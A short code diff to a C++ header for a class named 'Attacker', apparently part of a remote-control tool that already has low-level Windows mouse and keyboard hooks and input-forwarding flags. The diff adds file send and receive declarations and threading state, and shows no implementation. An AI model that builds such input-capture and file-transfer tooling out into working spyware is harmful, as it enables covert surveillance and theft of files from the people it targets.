@@ -19,6 +19,9 @@ private:
 	void handlePacket(sf::Packet& p);
 	void updateList(sf::Packet& p);
 
+	void sendFile(std::string path, uint32_t numPackets);
+	void getFile() {};
+
 	static LRESULT CALLBACK LowLevelMouseProc(int nCode, WPARAM wParam, LPARAM lParam);
 	static LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam);
 
@@ -44,6 +47,15 @@ private:
 	bool isSshActive = false;
 	bool isSendingMouse = false;
 	bool isSendingKeyboard = false;
+
+	static constexpr size_t packetSize = 256 * 256;
+	std::thread* sendFileThread = nullptr;
+	bool isSendingFile = false;
+	bool stopSendingFile = false;
+
+	std::thread* getFileThread = nullptr;
+	bool isGettingFile = false;
+	bool stopGettingFile = false;
 
 	static Attacker* attacker;
 	sf::Clock mouseTimer;
